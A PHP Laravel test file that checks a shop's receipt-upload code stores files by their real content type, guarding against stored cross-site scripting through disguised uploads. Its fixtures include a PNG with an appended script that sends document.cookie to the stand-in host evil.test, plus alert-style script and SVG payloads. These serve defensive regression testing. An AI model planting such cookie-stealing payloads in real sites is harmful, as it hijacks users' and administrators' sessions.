<?php

namespace Tests\Feature;

use App\Models\DeliveryMethod;
use App\Models\Order;
use App\Models\PaymentAccount;
use App\Models\Product;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * What a file IS decides what it is stored as — never what it is called.
 *
 * `storage/app/public` is symlinked into the document root, so a file written
 * there under a name the uploader chose is served from nefis.az with that
 * name's type. A real PNG called "cek.html" passes `mimes:png,…` (Laravel
 * reads the bytes) and used to be written straight through as .html, because
 * both the converter and the stored name were picked off the client's own
 * extension. The owner then opened it from the panel to check the receipt and
 * ran the customer's script inside his admin session.
 */
class UploadSafetyTest extends TestCase
{
    use RefreshDatabase;

    private function order(User $user): Order
    {
        PaymentAccount::create(['type' => PaymentAccount::CARD, 'label' => 'Kart', 'number' => '4169738111111111']);
        $box = Product::create(['name' => 'Test', 'slug' => 'test', 'is_active' => true, 'price' => 20,
            'template_width' => 969, 'template_height' => 1895]);
        $box->layers()->create(['name' => 'BG', 'image' => 'boxes/bg.webp', 'x' => 0, 'y' => 0,
            'width' => 969, 'height' => 1895, 'rotation' => 0, 'opacity' => 100, 'placement' => 'above', 'sort_order' => 0]);

        $this->actingAs($user)->post(route('cart.add'), ['product_id' => $box->id]);
        $this->actingAs($user)->post(route('checkout.store'), [
            'delivery_method_id' => DeliveryMethod::where('type', 'door')->value('id'),
            'contact_phone' => '1', 'delivery_address' => 'Bakı, Nizami küç. 5',
        ])->assertSessionHasNoErrors();

        return Order::latest('id')->firstOrFail();
    }

    /** A real PNG with a script after IEND, named like a web page. */
    private function pngNamed(string $name): UploadedFile
    {
        $im = imagecreatetruecolor(40, 40);
        ob_start();
        imagepng($im);
        $png = (string) ob_get_clean();
        $png .= "<script>fetch('https://evil.test/?c='+document.cookie)</script>";

        return UploadedFile::fake()->createWithContent($name, $png);
    }

    public function test_a_picture_named_like_a_web_page_is_not_written_as_one(): void
    {
        Storage::fake('public');

        /* A genuine upload, not a fake one: a fake takes its type from the
           name, which is the very thing under test. These bytes are a real
           PNG with a script after IEND, and the file is called "cek.html". */
        $tmp = tempnam(sys_get_temp_dir(), 'nefis');
        $im = imagecreatetruecolor(40, 40);
        ob_start();
        imagepng($im);
        file_put_contents($tmp, (string) ob_get_clean() . '<script>alert(1)</script>');
        $file = new \Symfony\Component\HttpFoundation\File\UploadedFile($tmp, 'cek.html', 'text/html', null, true);

        $this->assertSame('png', $file->guessExtension(), 'the bytes are a PNG whatever it is called');

        [$path] = \App\Support\ImageStore::store(
            \Illuminate\Http\UploadedFile::createFromBase($file), 'receipts', 'cek', 82, 1600
        );

        $this->assertStringEndsWith('.webp', $path, 'a PNG is re-encoded, whatever the phone called it');
        foreach (Storage::disk('public')->allFiles() as $written) {
            $this->assertDoesNotMatchRegularExpression('/\.(html?|svg|js|xhtml)$/i', $written);
        }
        @unlink($tmp);
    }

    public function test_a_kind_the_shop_does_not_store_is_refused_rather_than_written(): void
    {
        Storage::fake('public');

        $tmp = tempnam(sys_get_temp_dir(), 'nefis');
        file_put_contents($tmp, '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
        $file = new \Symfony\Component\HttpFoundation\File\UploadedFile($tmp, 'cek.png', 'image/png', null, true);

        try {
            \App\Support\ImageStore::store(
                \Illuminate\Http\UploadedFile::createFromBase($file), 'receipts', 'cek', 82, 1600
            );
            $this->fail('an svg should not reach the public disk');
        } catch (\Symfony\Component\HttpKernel\Exception\HttpException $e) {
            $this->assertSame(422, $e->getStatusCode());
        }

        $this->assertSame([], Storage::disk('public')->allFiles());
        @unlink($tmp);
    }

    public function test_a_photographed_receipt_for_a_surcharge_is_kept(): void
    {
        Storage::fake('public');
        $user = User::factory()->create();
        $order = $this->order($user);
        $order->forceFill(['status' => 'confirmed', 'payment_confirmed_at' => now()])->save();

        $extra = $order->adjustments()->create([
            'kind' => \App\Models\OrderAdjustment::CHARGE,
            'amount' => 5, 'reason' => 'Əlavə qutu', 'status' => \App\Models\OrderAdjustment::WAITING,
        ]);

        /* ImageStore::put() has never existed, so this path threw a fatal
           error and the money for every changed order went uncollected
           unless the customer happened to send a PDF. */
        $this->actingAs($user)
            ->post(route('orders.extra.receipt', [$order, $extra]), ['receipt' => $this->pngNamed('cek.jpg')])
            ->assertRedirect();

        $extra->refresh();
        $this->assertNotNull($extra->payment_receipt);
        $this->assertSame(\App\Models\OrderAdjustment::CHECK, $extra->status);
        Storage::disk('public')->assertExists($extra->payment_receipt);
    }
}
